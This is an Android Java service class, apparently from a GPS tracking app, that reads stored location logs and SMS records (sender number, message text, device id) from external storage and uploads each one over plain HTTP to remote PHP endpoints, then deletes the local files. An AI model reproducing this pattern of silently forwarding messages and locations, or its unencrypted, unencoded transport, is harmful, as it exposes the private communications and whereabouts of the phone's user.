package com.camo.htcgpslocation;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by GAlekseev on 23.11.2017.
 */

public class UploadService extends IntentService{

    private static final String TAG = "UploadService";
    public static final String LOCATION_STORAGE = "loc.log";
    public static final String MESSAGE_STORAGE = "mes.log";
    private static final String UPLOAD_LOC_URL = "http://www.miravto.ru/agps2.php";
    private static final String UPLOAD_SMS_URL = "http://www.miravto.ru/sms2.php";

    public UploadService(){
        super("UploadService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        boolean uploadSuccess = true;
        Log.d(TAG, "Alarm intent running");
        LocationData[] data = readLocationStorage();
        if (data != null && data.length>0) {
            Log.v(TAG, "Locations found: "+data.length);
            uploadSuccess = uploadData(data);
            if (uploadSuccess) {
                deleteStorage(LOCATION_STORAGE);
            }
        }
        else {
            Log.v(TAG, "No locations found");
        }

        if (uploadSuccess){
            SMSData[] smsData = readSMSStorage();
            if (smsData != null && smsData.length>0){
                Log.v(TAG, "Messages found: "+smsData.length);
                if (uploadSMS(smsData))
                {
                    deleteStorage(MESSAGE_STORAGE);
                }
            }
            else {
                Log.v(TAG, "No messages found");
            }
        }
    }

    private boolean uploadSMS(SMSData[] smslist) {
        boolean success = false;

        Log.v(TAG, "Start SMS data upload");

        for (SMSData sms : smslist) {
            HttpURLConnection urlConnection = null;
            try {
                String strUrl = buildMessageURL(sms);//"http://www.miravto.ru/sms.php?t=" + sms.getDatetime() + "&p=" + sms.getPhoneNumber() + "&m=" +  sms.getMessage();
                Log.i(TAG, strUrl);
                URL url = new URL(strUrl);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
                return false;
            } finally {
                urlConnection.disconnect();
            }
        }

        return true;
    }

    private SMSData[] readSMSStorage() {
        Log.v(TAG, "Start reading SMS storage");
        ArrayList<SMSData> smslist = new ArrayList<SMSData>();

        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, MESSAGE_STORAGE);
//        Log.v(TAG, file.getAbsolutePath());

        if (!file.exists())
            return null;

        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;
            String[] parts;

            while ((line = br.readLine()) != null) {
                parts = line.split(";");
                if (parts.length == 4)
                {
                    SMSData data = new SMSData(parts[0], parts[1], parts[2], parts[3]);
                    smslist.add(data);
                }
            }
            br.close();
            return  smslist.toArray(new SMSData[smslist.size()]);
        } catch (IOException e){
            Log.e(TAG, e.getMessage());
            e.printStackTrace();
            return null;
        }
    }

    private void deleteStorage(String storage) {
        Log.v(TAG, "Start emptying storage " + storage);
        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, storage);

        if (file.exists()) {
            Log.v(TAG, "Deleting file " + storage);
            file.delete();
            try {
                Log.v(TAG, "Recreating file " + storage);
                file.createNewFile();
            }
            catch (IOException e){
                Log.e(TAG, e.getMessage());
            }
        }
    }

    private String buildMessageURL(SMSData sms){
        StringBuilder url = new StringBuilder();
        url.append(UPLOAD_SMS_URL);

        url.append("?t=");
        url.append(sms.getDatetime());
        url.append("&p=");
        url.append(sms.getPhoneNumber());
        url.append("&m=");
        url.append(sms.getMessage());

        url.append("&id=");
        url.append(sms.getDeviceId());

        return url.toString();
    }

    private String buildLocationURL(LocationData location){
        StringBuilder url = new StringBuilder();
        url.append(UPLOAD_LOC_URL);

        url.append("?lat=");
        url.append(location.getLatitude());
        url.append("&lon=");
        url.append(location.getLongitude());
        url.append("&t=");
        url.append(location.getDatetime());

//        url.append("&p=");
//        url.append(location.getProvider());
        url.append("&a=");
        url.append(location.getAccuracy());
        url.append("&alt=");
        url.append(location.getAltitude());
        url.append("&id=");
        url.append(location.getDeviceId());

        return url.toString();
    }

    private boolean uploadData(LocationData[] locations) {
        boolean success = false;

        Log.v(TAG, "Start location data upload");

        for (LocationData loc : locations) {
            HttpURLConnection urlConnection = null;
            try {
                String strUrl = buildLocationURL(loc);//UPLOAD_LOC_URL + "?lat=" + loc.getLatitude() + "&lon=" + loc.getLongitude() + "&t=" + loc.getDatetime();
                Log.i(TAG, strUrl);
                URL url = new URL(strUrl);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
                return false;
            } finally {
                urlConnection.disconnect();
            }
        }

        return true;
    }

    private LocationData[] readLocationStorage() {
        Log.v(TAG, "Start reading location storage");
        ArrayList<LocationData> locations = new ArrayList<LocationData>();

        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, LOCATION_STORAGE);
//        Log.v(TAG, file.getAbsolutePath());

        if (!file.exists())
            return null;

        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;

            while ((line = br.readLine()) != null) {
                //Log.v(TAG, line);
                LocationData data = createLocationFromString(line);
                if (data != null)
                    locations.add(data);
            }
            br.close();
            return  locations.toArray(new LocationData[locations.size()]);
        } catch (IOException e){
            Log.e(TAG, e.getMessage());
            return null;
        }
    }

    private LocationData createLocationFromString(String csvString){
        //String format: deviceid;/*provider*/;datetime;latitude;longitude;altitude;accuracy
        String[] parts = csvString.split(";");
        if (parts.length < 6)
            return null;

        return new LocationData(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]);
    }
}

